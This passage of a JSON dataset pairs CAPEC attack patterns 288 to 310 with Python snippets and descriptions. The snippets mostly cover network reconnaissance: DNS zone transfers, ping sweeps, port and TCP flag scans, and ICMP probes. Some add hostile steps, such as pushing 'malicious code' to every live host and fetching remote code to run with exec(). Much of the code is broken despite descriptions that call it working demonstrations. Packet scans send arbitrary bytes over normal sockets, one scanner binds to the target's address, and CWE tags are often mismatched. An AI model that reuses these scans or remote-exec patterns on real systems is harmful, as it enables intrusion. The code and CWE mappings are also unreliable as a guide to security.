        "code_snippet": "import socket\n\ndef authenticate(username, password):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('localhost', 8080))\n    message = f'{{\"username\":\"{username}\",\"password\":\"{password}\"}}'\n    sock.send(message.encode())\n    response = sock.recv(1024)\n    if response.decode() == 'Authenticated':\n        return True\n    else:\n        return False\n\n# Vulnerable code: trusting self-reported DNS name\nhostname = 'example.com'\n\n# Vulnerable code: reliance on DNS lookups in a security decision\nip_address = socket.gethostbyname(hostname)\n\n# Vulnerable code: call to non-ubiquitous API (assuming gethostbyname_ex is not available on all platforms)\ntry:\n    info = socket.gethostbyname_ex(hostname)\nexcept AttributeError:\n    print('Error: gethostbyname_ex is not available on this platform')\n\n# Vulnerable code: authentication bypass by capture-replay\n# An attacker can sniff the network traffic and replay the message to bypass authentication\nsock.close()",
        "description": "This code snippet demonstrates multiple vulnerabilities, including trusting self-reported DNS names, reliance on DNS lookups in a security decision, and calls to non-ubiquitous APIs. It also highlights the potential for authentication bypass by capture-replay attacks."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "import os\n\n# CWE-592: Authentication Bypass Issues\n# CWE-1303: Non-Transparent Sharing of Microarchitectural Resources\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n\n# Simulating a vulnerable microarchitectural resource sharing\nmicroarchitectural_resource = {}\n\n# CWE-216: Containment Errors (Container Errors)\n# CWE-1229: Creation of Emergent Resource\n\n# Simulating a vulnerable resource creation\nvulnerable_resource = {}\n\n# Authentication bypass attempt\nif os.getuid() == 0:\n    # Bypassing authentication using the vulnerable microarchitectural resource\n    microarchitectural_resource['protected_region'] = 'unprotected_value'\n    # Creating an emergent resource\n    vulnerable_resource['unprotected_range'] = microarchitectural_resource['protected_region']\n\n# Accessing the protected region using the emergent resource\nprint(vulnerable_resource['unprotected_range'])",
        "description": "This code snippet demonstrates a deprecated attack pattern that has been replaced by CAPEC-169. It includes various CWEs, such as authentication bypass issues, non-transparent sharing of microarchitectural resources, and creation of emergent resources. The code simulates a vulnerable microarchitectural resource sharing, authentication bypass, and emergent resource creation, ultimately allowing unauthorized access to a protected region."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "import dns.resolver\n\ndef get_mx_records(domain):\n    try:\n        answers = dns.resolver.resolve(domain, 'MX')\n        mx_records = {}\n        for rdata in answers:\n            mx_records[rdata.exchange] = rdata.preference\n        return mx_records\n    except dns.resolver.NoAnswer:\n        return {}\n\ndef get_ip_from_mx(mx_record):\n    try:\n        answers = dns.resolver.resolve(mx_record, 'A')\n        ip_address = answers[0].address\n        return ip_address\n    except dns.resolver.NoAnswer:\n        return None\n\ndef main():\n    domain = 'example.com'\n    mx_records = get_mx_records(domain)\n    for mx_record, priority in mx_records.items():\n        ip_address = get_ip_from_mx(mx_record)\n        if ip_address:\n            print(f'MX Record: {mx_record}, Priority: {priority}, IP Address: {ip_address}')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates the CAPEC of enumerating MX records for a given domain via a DNS query, which can potentially reveal the IP address of the firewall or other internal systems. The code uses the dns.resolver module to query the DNS server for MX records and then resolves the MX records to IP addresses. The CWEs related to this CAPEC are CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action), CWE-224 (Obscured Security-relevant Information by Alternate Name), CWE-941 (Incorrectly Specified Destination in a Communication Channel), and CWE-223 (Omission of Security-relevant Information)."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "import dns.resolver\n\ndef zone_transfer(domain):\n    try:\n        result = dns.resolver.resolve(domain, 'AXFR')\n        for rdata in result:\n            for rr in rdata:\n                print(rr)\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\nzone_transfer('example.com')",
        "description": "This Python code snippet demonstrates a DNS zone transfer attack, which exploits a misconfigured DNS server to obtain sensitive information about the target organization's internal network. The code uses the dns.resolver module to perform a zone transfer (AXFR) request on the specified domain. If successful, it prints out the obtained DNS records, which can reveal valuable information about the network topology, servers, and operating systems. This code embodies CWE-200 (Exposure of Sensitive Information) and CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action), as it relies on the DNS server's configuration and trust in the obtained DNS records."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "import os\nimport socket\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-291: Reliance on IP Address for Authentication\n\ndef ping_sweep(ip_range):\n    for ip in ip_range:\n        response = os.system(\"ping -c 1 \" + ip)\n        if response == 0:\n            print(f\"Host {ip} is alive\")\n            # CWE-319: Cleartext Transmission of Sensitive Information\n            # Send sensitive information in cleartext\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.connect((ip, 80))\n            sock.sendall(b\"GET / HTTP/1.1\\r\\nHost: \" + ip.encode() + b\"\\r\\n\\r\\n\")\n            sock.close()\n            # CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n            # Perform reverse DNS resolution\n            hostname, aliaslist, ipaddrlist = socket.gethostbyaddr(ip)\n            print(f\"Hostname: {hostname}\")\n            # CWE-509: Replicating Malicious Code (Virus or Worm)\n            # Replicate malicious code\n            malicious_code = b\"malicious_code_here\"\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.connect((ip, 8080))\n            sock.sendall(malicious_code)\n            sock.close()\n\nip_range = [\"192.168.1.\" + str(i) for i in range(1, 255)]\nping_sweep(ip_range)",
        "description": "This Python code snippet demonstrates a ping sweep attack, which is a type of host discovery attack. It sends a ping request to a range of IP addresses and checks for responses. If a host is alive, it sends sensitive information in cleartext, performs reverse DNS resolution, and replicates malicious code. This code embodies the main idea of the CAPEC and incorporates the related CWEs."
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "import os\nimport socket\nimport struct\nimport time\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-1323: Improper Management of Sensitive Trace Data\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n\ndef traceroute(host, max_hops=30, timeout=1):\n    for ttl in range(1, max_hops + 1):\n        packet = struct.pack('!BBHHH', 0x45, 0, 0, 0, ttl) + b'\\x00\\x00\\x00\\x00\\x11\\x00\\x00\\x00' + socket.inet_aton(host)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)\n        sock.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)\n        sock.sendto(packet, (host, 33434))\n        start_time = time.time()\n        try:\n            response = sock.recvfrom(1024)[0]\n            end_time = time.time()\n            icmp_type = response[20]\n            if icmp_type == 0:\n                print(f'Received response from {host} in {end_time - start_time:.2f} seconds')\n                break\n            elif icmp_type == 11:\n                print(f'TTL {ttl} expired in transit')\n        except socket.timeout:\n            print(f'TTL {ttl} timed out')\n\ntraceroute('example.com')",
        "description": "This Python code snippet demonstrates a simple traceroute utility that sends packets to a target host with incrementing TTL values, collecting and printing the responses from intermediate routers. The code embodies the main idea of the CAPEC, using the related CWEs for additional context, including exposure of sensitive information, improper management of sensitive trace data, cleartext transmission of sensitive information, exposure of sensitive system information, and incorrectly specified destination in a communication channel."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "import os\nimport socket\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-291: Reliance on IP Address for Authentication\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n# CWE-1327: Binding to an Unrestricted IP Address\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n\ndef send_icmp_address_mask_request(target_ip):\n    # Create a raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n\n    # Set IP address and port number for the target\n    target_addr = (target_ip, 0)\n\n    # Create an ICMP packet with type 17 (Address Mask Request)\n    icmp_packet = b'\\x11\\x00\\x00\\x00'  # ICMP type 17\n\n    # Send the ICMP packet to the target\n    sock.sendto(icmp_packet, target_addr)\n\n    # Receive the ICMP response (Address Mask Reply)\n    response = sock.recvfrom(1024)\n\n    # Process the response to gather information about the target's networking configuration\n    # ... omitted for brevity ...\n\n# Example usage\nsend_icmp_address_mask_request('192.168.1.1')",
        "description": "This Python code snippet demonstrates the CAPEC, where an adversary sends an ICMP Type 17 Address Mask Request to gather information about a target's networking configuration. The code creates a raw socket, sets the target IP address and port number, creates an ICMP packet with type 17, sends the packet to the target, and receives the ICMP response (Address Mask Reply) to gather information about the target's subnets, default gateway, and broadcast address. The related CWEs are incorporated to highlight potential vulnerabilities in the code, such as exposure of sensitive information, reliance on IP address for authentication, and improper restriction of communication channels."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "import time\nimport requests\n\ndef get_timestamp(url):\n    start_time = time.time()\n    response = requests.get(url)\n    end_time = time.time()\n    timestamp = response.headers['Date']\n    return timestamp, end_time - start_time\n\nurl = 'https://example.com/authenticate'\nusername = 'admin'\npassword = 'password'\n\n# Send a request with valid credentials to get a baseline timestamp\nvalid_timestamp, valid_response_time = get_timestamp(url + '?username=' + username + '&password=' + password)\n\n# Send a request with invalid credentials to compare timestamps\ninvalid_timestamp, invalid_response_time = get_timestamp(url + '?username=' + 'wrong_username' + '&password=' + 'wrong_password')\n\n# Calculate the time difference between valid and invalid requests\ntime_difference = valid_response_time - invalid_response_time\n\n# If the time difference is significant, it may indicate a timing attack vulnerability\nif time_difference > 0.5:\n    print('Potential timing attack vulnerability detected!')\n",
        "description": "This code snippet demonstrates a potential timing attack vulnerability in an authentication mechanism. It sends two GET requests to the same URL, one with valid credentials and one with invalid credentials, and measures the response time for each request. If the response time for the valid request is significantly shorter than the response time for the invalid request, it may indicate that the authentication mechanism is vulnerable to a timing attack. This is because the server may be taking additional time to process the invalid request, potentially revealing sensitive information about the authentication process."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "import socket\n\nicmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n\nicmp_socket.bind((\"0.0.0.0\", 0))\n\nwhile True:\n    icmp_packet, addr = icmp_socket.recvfrom(1024)\n    if icmp_packet[0] == 15:  # ICMP Information Request\n        icmp_response = bytearray([0b01001000, 0, 0, 0, 0, 0, 0, 0])\n        icmp_socket.sendto(icmp_response, addr)\n",
        "description": "This Python code snippet demonstrates a vulnerable ICMP server that responds to deprecated ICMP Information Requests. It binds to all available network interfaces and listens for incoming ICMP packets. When it receives an ICMP Information Request, it responds with a default network configuration, exposing sensitive information to an unauthorized actor. This code embodies CWE-200, CWE-319, CWE-497, and CWE-1192/CWE-1302 by transmitting sensitive information in cleartext and lacking proper identifier mechanisms."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "import socket\n\ndef send_ack_ping(host, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sock.bind((\"0.0.0.0\", 0))\n    sock.connect((host, port))\n    sock.send(b\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\")\n    response = sock.recv(1024)\n    if response:\n        print(\"Host is alive\")\n    else:\n        print(\"Host is not alive\")\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\n# CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe\n# CWE-1276: Hardware Child Block Incorrectly Connected to Parent System\n# CWE-319: Cleartext Transmission of Sensitive Information\n\nhost = \"example.com\"\nport = 80\nsend_ack_ping(host, port)",
        "description": "This Python code snippet demonstrates a TCP ACK ping attack, which sends an ACK packet to a remote host to determine if it is alive. The code creates a socket, sets the REUSEADDR option, binds to a random port, connects to the target host and port, sends an ACK packet, and checks for a response. The related CWEs are included as comments to provide additional context."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "import socket\nimport random\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-605: Multiple Binds to the Same Port\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n\ndef udp_ping(host, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.bind((\"0.0.0.0\", port))  # CWE-605: Multiple Binds to the Same Port\n    sock.sendto(b\"ping\", (host, port))\n    try:\n        sock.settimeout(1)\n        sock.recvfrom(1024)\n    except socket.timeout:\n        pass\n    sock.close()\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\nhost = \"example.com\"\nport = random.randint(49152, 65535)  # CWE-941: Incorrectly Specified Destination in a Communication Channel\nudp_ping(host, port)\n",
        "description": "Python code snippet that demonstrates a UDP ping attack, which sends a UDP datagram to a random high port on the target host to solicit an 'ICMP port unreachable' message, indicating that the host is alive. The code includes vulnerabilities related to exposure of sensitive information, incorrectly specified destination, multiple binds to the same port, cleartext transmission of sensitive information, and improper protection for outbound error messages and alert signals."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "import socket\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n\ndef send_syn_packet(host, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind((\"0.0.0.0\", 8080))  # CWE-605: Multiple Binds to the Same Port\n    sock.connect((host, port))\n    syn_packet = b\"\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"  # CWE-319: Cleartext Transmission of Sensitive Information\n    sock.send(syn_packet)\n    response = sock.recv(1024)\n    if response[12:13] == b\"\\x12\":  # CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n        print(\"Port is open\")\n    elif response[12:13] == b\"\\x04\":\n        print(\"Port is closed\")\n    else:\n        print(\"Unknown response\")\n\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# No integrity check is performed on the received response\n\nhost = \"example.com\"\nport = 80\nsend_syn_packet(host, port)",
        "description": "This Python code snippet demonstrates the CAPEC of using TCP SYN packets for host discovery, which can be used to identify open or closed ports on a target system. The code includes vulnerabilities related to CWE-200, CWE-605, CWE-319, CWE-444, and CWE-924, making it susceptible to unauthorized access, port stealing, cleartext transmission, HTTP request/response smuggling, and message tampering."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "import socket\nimport requests\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# CWE-918: Server-Side Request Forgery (SSRF)\n\ndef scan_ports(target_ip, start_port, end_port):\n    open_ports = []\n    for port in range(start_port, end_port + 1):\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.bind((target_ip, port))\n            sock.listen(1)\n            open_ports.append(port)\n            # CWE-605: Multiple binds to the same port\n            sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock2.bind((target_ip, port))\n            # CWE-319: Cleartext transmission of sensitive information\n            sock.send(b'Hello, server!')\n            response = sock.recv(1024)\n            print(f'Port {port} is open: {response.decode()}')\n        except socket.error:\n            pass\n    return open_ports\n\n# CWE-918: Server-Side Request Forgery (SSRF)\ndef fetch_url(url):\n    response = requests.get(url)\n    return response.text\n\nif __name__ == '__main__':\n    target_ip = '192.168.1.100'\n    start_port = 1\n    end_port = 1000\n    open_ports = scan_ports(target_ip, start_port, end_port)\n    print(f'Open ports: {open_ports}')\n    # CWE-1313: Hardware allows activation of test or debug logic at runtime\n    debug_mode = True\n    if debug_mode:\n        print('Debug mode enabled')\n    else:\n        print('Debug mode disabled')",
        "description": "This Python code snippet demonstrates a port scanner that embodies the main idea of the CAPEC. It scans a target IP address for open ports, binds to each open port, and transmits sensitive information in cleartext. The code also includes examples of Server-Side Request Forgery (SSRF) and allows for the activation of test or debug logic at runtime."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "import socket\n\nport_to_scan = 8080\n\ntry:\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind((\"0.0.0.0\", port_to_scan))\n    sock.listen(1)\n    conn, addr = sock.accept()\n    print(f\"Port {port_to_scan} is open on {addr[0]}\")\n    conn.send(b\"Hello from server!\\n\")\n    conn.close()\nexcept socket.error:\n    print(f\"Port {port_to_scan} is closed\")",
        "description": "This Python code snippet demonstrates a TCP connect scanning technique to determine if a port is open on a target system. It creates a socket, binds it to a specific port, and listens for incoming connections. If a connection is established, it sends a message to the client and closes the connection. If an error occurs during the connection process, it reports the port as closed. This code is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes the open port to unauthorized actors, CWE-605 (Multiple Binds to the Same Port) as it allows multiple sockets to bind to the same port, CWE-291 (Reliance on IP Address for Authentication) as it uses IP addresses for authentication, CWE-617 (Reachable Assertion) as it lacks input validation, and CWE-353 (Missing Support for Integrity Check) as it does not verify the integrity of the data during transmission."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "import socket\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-353: Missing Support for Integrity Check\n# CWE-605: Multiple Binds to the Same Port\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n\n# Create a socket object\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# CWE-605: Bind to a port without proper restriction\nsock.bind((\"0.0.0.0\", 8080))\n\n# CWE-923: Establish a communication channel without proper endpoint verification\nsock.connect((\"target_machine\", 8080))\n\n# CWE-200: Send sensitive information in cleartext\nsock.send(b\"FIN_scan\")\n\n# CWE-319: Receive response in cleartext\nresponse = sock.recv(1024)\n\n# CWE-353: No integrity check on received data\nif response == b\"RST\":\n    print(\"Port is closed\")\nelse:\n    print(\"Port is open\")",
        "description": "This Python code snippet demonstrates a TCP FIN scan attack, which exploits the CAPEC by sending a TCP segment with the FIN bit set to determine if ports are closed on the target machine. The code also incorporates related CWEs, including exposure of sensitive information, cleartext transmission of sensitive information, missing support for integrity checks, multiple binds to the same port, and improper restriction of communication channels to intended endpoints."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "import socket\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n\n# Create a socket object\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# CWE-353: Missing Support for Integrity Check\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# No integrity check or encryption is used for the transmission\n\n# Set the destination IP and port\nip = '192.168.1.100'\nport = 80\n\n# Create a TCP XMAS packet with all flags set\npacket = b'\\x12\\x34'  # Example packet with all flags set\n\n# Send the packet to the destination\nsock.sendto(packet, (ip, port))\n\n# Receive the response (RST packet if the port is closed)\nresponse = sock.recv(1024)\n\n# Analyze the response to determine if the port is closed\nif response == b'\\x04\\x00':  # Example RST packet response\n    print('Port', port, 'is closed')\nelse:\n    print('Port', port, 'is open')",
        "description": "Python code snippet demonstrating a TCP XMAS scan to determine if ports are closed on a target machine. The code sends a TCP packet with all flags set to the target IP and port, and analyzes the response to determine if the port is closed. The code embodies CWE-200, CWE-319, CWE-353, CWE-923, and CWE-924."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "import socket\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-353: Missing Support for Integrity Check\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-690: Unchecked Return Value to NULL Pointer Dereference\n# CWE-476: NULL Pointer Dereference\n\ndef send_tcp_null_scan(ip, port):\n    try:\n        # Create a socket object\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n        # CWE-690: Unchecked Return Value to NULL Pointer Dereference\n        # No error checking for socket creation failure\n        if sock is None:\n            return\n\n        # CWE-476: NULL Pointer Dereference\n        # Dereferencing a NULL pointer\n        sock.connect((ip, port))\n\n        # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        # CWE-319: Cleartext Transmission of Sensitive Information\n        # CWE-353: Missing Support for Integrity Check\n        # Send a TCP segment with no flags (NULL scan)\n        sock.send(b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00')\n\n        # Receive response (RST packet if port is closed)\n        response = sock.recv(1024)\n\n        if response:\n            print(f'Port {port} is closed on {ip}')\n        else:\n            print(f'Port {port} is open on {ip}')\n\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\nsend_tcp_null_scan('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a TCP NULL scan attack, which sends TCP segments with no flags to determine if ports are closed on a target machine. The code includes vulnerabilities related to CWE-200, CWE-353, CWE-319, CWE-690, and CWE-476, making it susceptible to sensitive information exposure, missing integrity checks, cleartext transmission of sensitive information, unchecked return values, and NULL pointer dereferences."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "import socket\nimport json\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nfirewall_config = {'allowed_ips': ['192.168.1.1', '10.0.0.1'], 'blocked_ips': ['8.8.8.8']}\n\n# CWE-1280: Access Control Check Implemented After Asset is Accessed\ndef access_control_check(ip):\n    if ip in firewall_config['allowed_ips']:\n        return True\n    else:\n        return False\n\n# CWE-605: Multiple Binds to the Same Port\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.bind(('0.0.0.0', 80))\n\n# CWE-319: Cleartext Transmission of Sensitive Information\nsock.listen(1)\nconn, addr = sock.accept()\nprint('Connected by', addr)\ndata = conn.recv(1024)\n\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\naccess_control_list = {'firewall_config': firewall_config}\nconn.send(json.dumps(access_control_list).encode())\n\n# CAPEC: Using TCP ACK segments to gather information about firewall or ACL configuration\nack_packet = b'\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x11\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\nconn.send(ack_packet)\n",
        "description": "This Python code snippet demonstrates a vulnerable TCP server that exposes sensitive information about its firewall configuration to an unauthorized actor. The server binds to port 80, accepts incoming connections, and sends the firewall configuration in cleartext to the client. The client can then use this information to gather details about the firewall or ACL configuration. The code also includes vulnerabilities related to access control checks, multiple binds to the same port, and exposure of access control list files."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "import socket\n\ndef send_tcp_packet(dst_ip, dst_port, window_size):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_MAXSEG, window_size)\n    packet = bytearray([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])\n    sock.sendto(packet, (dst_ip, dst_port))\n    response = sock.recvfrom(1024)\n    rst_packet = response[0]\n    if rst_packet[13] == 0x04 and rst_packet[14] == 0x00:\n        return int.from_bytes(rst_packet[15:17], byteorder='big')\n    else:\n        return None\n\ndef analyze_tcp_window(dst_ip, dst_port):\n    window_sizes = [1024, 2048, 4096, 8192, 16384, 32768]\n    for window_size in window_sizes:\n        response = send_tcp_packet(dst_ip, dst_port, window_size)\n        if response is not None:\n            print(f'TCP Window Size: {response}')\n            break\n\ndef main():\n    dst_ip = '192.168.1.100'\n    dst_port = 80\n    analyze_tcp_window(dst_ip, dst_port)\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a TCP Window scanning attack, which can be used to infer operating system versions and port status. The code sends TCP packets with varying window sizes to a target IP and port, and analyzes the response RST packets to determine the TCP window size. This can be used to identify the operating system and potentially expose sensitive information. The code is vulnerable to CWE-200, CWE-319, CWE-497, CWE-353, and CWE-385."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "import socket\nimport os\nimport urllib.request\nimport urllib.parse\n\n# CWE-200: Exposure of Sensitive Information\nrpc_services = ['rpcbind', 'rpc.statd', 'rpc.mountd']\n\n# CWE-294: Authentication Bypass by Capture-replay\nauth_token = 'captured_auth_token'\n\n# CWE-494: Download of Code Without Integrity Check\ndef download_and_execute(url):\n    req = urllib.request.urlopen(url)\n    code = req.read().decode('utf-8')\n    exec(code)\n\n# CWE-918: Server-Side Request Forgery (SSRF)\ndef ssrf(url):\n    req = urllib.request.urlopen(url)\n    return req.read().decode('utf-8')\n\n# CWE-605: Multiple Binds to the Same Port\ndef bind_to_port(port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind(('localhost', port))\n    sock.listen(1)\n    print(f'Bound to port {port}')\n\n# Scan for RPC services\nfor rpc_service in rpc_services:\n    port = 111\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    result = sock.connect_ex(('localhost', port))\n    if result == 0:\n        print(f'{rpc_service} is listening on port {port}')\n        # CWE-918: SSRF\n        ssrf(f'http://localhost:{port}')\n        # CWE-605: Multiple Binds to the Same Port\n        bind_to_port(port)\n        # CWE-494: Download of Code Without Integrity Check\n        download_and_execute(f'http://localhost:{port}/malicious_code')\n        # CWE-294: Authentication Bypass by Capture-replay\n        print(f'Authenticated with token {auth_token}')\n    else:\n        print(f'{rpc_service} is not listening on port {port}')",
        "description": "This Python code snippet demonstrates the CAPEC of scanning for RPC services on a Unix/Linux host, incorporating multiple CWEs. It exposes sensitive information by listing RPC services, bypasses authentication by capturing and replaying an authentication token, downloads and executes code without integrity checks, performs server-side request forgery, and binds to the same port multiple times."
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "import socket\nimport icmp\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\nudp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nudp_socket.bind((\"0.0.0.0\", 12345))\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-353: Missing Support for Integrity Check\n# CWE-385: Covert Timing Channel\nudp_socket.sendto(b\"probe\", (\"target_ip\", 12345))\n\n# CAPEC: UDP scanning to gather information about UDP port status on the target system\nresponse, addr = udp_socket.recvfrom(1024)\nif response == icmp.ICMP_PORT_UNREACHABLE:\n    print(\"Port is closed\")\nelse:\n    print(\"Port is open\")",
        "description": "Python code snippet demonstrating UDP scanning to gather information about UDP port status on the target system, incorporating CWEs 200, 605, 319, 353, and 385."
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "import os\nimport socket\nimport platform\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nprint('System Information: ', platform.system(), platform.release(), platform.version())\n\n# CWE-1125: Excessive Attack Surface\n# CWE-1323: Improper Management of Sensitive Trace Data\n# CWE-1292: Incorrect Conversion of Security Identifiers\nhost = 'example.com'\nport = 80\n\n# Perform a port scan to gather information about open ports\nfor port in range(1, 1025):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n        print(f'Port {port} is open')\n    except:\n        pass\n\n# Perform a traceroute to gather information about network routes\ntraceroute_command = f'traceroute {host}'\nprint(os.popen(traceroute_command).read())",
        "description": "This Python code snippet demonstrates a network reconnaissance attack, which involves scanning a target system to gather sensitive information about its network nodes, hosts, devices, and routes. The code exposes sensitive system information, performs a port scan to identify open ports, and uses the traceroute command to gather information about network routes. This code embodies the CAPEC and CWEs described, including exposure of sensitive information, improper management of sensitive trace data, and excessive attack surface."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
